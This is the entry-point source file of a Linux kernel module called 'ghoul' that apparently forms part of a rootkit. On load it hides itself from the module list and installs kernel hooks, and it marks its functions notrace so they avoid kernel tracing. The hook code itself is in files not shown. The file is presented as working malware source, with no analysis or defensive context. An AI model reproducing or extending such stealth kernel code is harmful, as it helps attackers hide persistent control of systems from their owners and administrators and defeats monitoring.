#include <linux/module.h>
#include "ghoul.h"
#include "load.h"

int hooks_installed = 0;

notrace static int __init ghoul_init(void)
{
    int err;

    debug("ghoul: inserted\n");
    hide_module();

    err = register_hooks();
    if (err) {
        error("ghoul: failed registering hooks (error code %d)\n", err);
        goto unload;
    }
    hooks_installed = 1;
    goto out;

unload:
    // show module and unload
    show_module();
    unload_module();
out:
    return 0;
}

notrace static void __exit ghoul_exit(void)
{
    if (hooks_installed)
        unregister_hooks();
    free_allocations();
    debug("ghoul: removed\n");
}

module_init(ghoul_init)
module_exit(ghoul_exit)
MODULE_LICENSE("GPL");